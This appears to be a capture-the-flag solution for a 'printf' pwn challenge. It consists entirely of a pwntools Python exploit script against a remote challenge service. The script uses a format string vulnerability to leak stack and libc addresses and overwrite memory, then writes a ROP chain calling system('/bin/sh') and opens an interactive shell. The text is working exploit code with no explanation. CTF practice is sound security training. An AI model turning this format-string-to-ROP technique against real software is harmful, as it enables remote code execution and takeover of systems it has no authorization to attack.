## PWN - PRINTF

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./printf_patched")
libc = ELF("./libc.so.6")
context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

# remote vs local
io = remote("pwn.blitzhack.xyz", 4646)

# 1) leak a stack address
io.recvuntil(b'this: 0x')
stack_leak = int(io.recvline().strip(), 16)
log.info(f'stack_leak = {hex(stack_leak)}')

# 2) overwrite one byte (as before) to pivot or fix up
#    here unchanged from your original
payload1  = b'%75$p' + b'---'
payload1 += fmtstr_payload(
    9,
    { stack_leak - 0x14: b'\x12' },
    numbwritten=0x11
)
io.sendline(payload1)

# 3) leak libc
io.recvuntil(b'go!!\n')
libc_leak = int(io.recvuntil(b'-')[:-1], 16)
libc.address = libc_leak - 0x29d90
log.info(f'libc_leak  = {hex(libc_leak)}')
log.success(f'libc.base  = {hex(libc.address)}')

# 4) build ROP chain
rop = ROP(libc)
rop.raw(rop.find_gadget(['ret']).address)
rop.system(next(libc.search(b'/bin/sh\x00')))
chain = rop.chain()

# 5) add exactly one extra byte of padding (NOP) to the chain
chain_padded = chain + b'\x90'

# 6) leak stack again for the second overwrite
io.recvuntil(b'this: 0x')
stack_leak = int(io.recvline().strip(), 16)
log.info(f'second stack_leak = {hex(stack_leak)}')

# 7) do second fmtstr write of the full (padded) ROP chain
payload2 = fmtstr_payload(
    8,
    { stack_leak - 0x14: chain_padded }
)
io.sendline(payload2)

# let’s clean up and pop a shell
io.clean(timeout=0.5)
io.interactive()
```